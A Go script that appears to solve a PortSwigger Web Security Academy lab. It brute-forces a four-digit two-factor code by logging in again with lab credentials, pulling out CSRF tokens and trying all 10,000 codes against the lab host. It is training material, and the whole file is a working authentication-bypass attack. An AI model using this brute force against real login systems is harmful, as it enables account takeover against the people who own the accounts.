// https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack

package main

import (
	//"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	//"os"
	"regexp"
	"strings"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0a940025038cfaabc0cd59aa00bf00a5.web-security-academy.net"
	loginUrl := u + "/login"
	loginUrl2 := u + "/login2"

	username := "carlos"
	password := "montoya"

	for i:=0; i<10000; i++ {
		body, err := get(loginUrl, client)
		if err != nil {
			return err
		}
		csrfToken := parseCSRFToken(body)

		_, body, err = login(loginUrl, username, password, csrfToken, client)
		if err != nil {
			return err
		}
		//fmt.Printf("Login: status %v\n", status)
		csrfToken = parseCSRFToken(body)

		code := fmt.Sprintf("%04d", i)
		_, body, err = postCode(loginUrl2, code, csrfToken, client)
		if err != nil {
			return err
		}
		if !strings.Contains(body, "Incorrect security code") {
			break
		}
	}

	fmt.Println("Done")
	return nil
}

func setCookie(client *http.Client, us, name, value string) error {
	u, err := url.Parse(us)
	if err != nil {
		return err
	}
	c := &http.Cookie{Name: name, Value: value}
	client.Jar.SetCookies(u, []*http.Cookie{c})
	return nil
}

func login(u, username, password, csrfToken string, client *http.Client) (int, string, error) {
	resp, err := client.PostForm(u, url.Values{
		"username": {username},
		"password": {password},
		"csrf": {csrfToken},
	})
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	//if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
	//	return "", fmt.Errorf("%v", resp.Status)
	//}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	return resp.StatusCode, string(body), nil
}

func postCode(u, code, csrfToken string, client *http.Client) (int, string, error) {
	fmt.Printf("Post code %v\n", code)
	resp, err := client.PostForm(u, url.Values{
		"mfa-code": {code},
		"csrf": {csrfToken},
	})
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	//if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
	//	return "", fmt.Errorf("%v", resp.Status)
	//}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	return resp.StatusCode, string(body), nil
}

var csrfRE *regexp.Regexp = regexp.MustCompile(`name="csrf" value="([^"]+)"`)

func get(url string, client *http.Client) (string, error) {
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func parseCSRFToken(body string) string {
	return string(csrfRE.FindStringSubmatch(body)[1])
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}


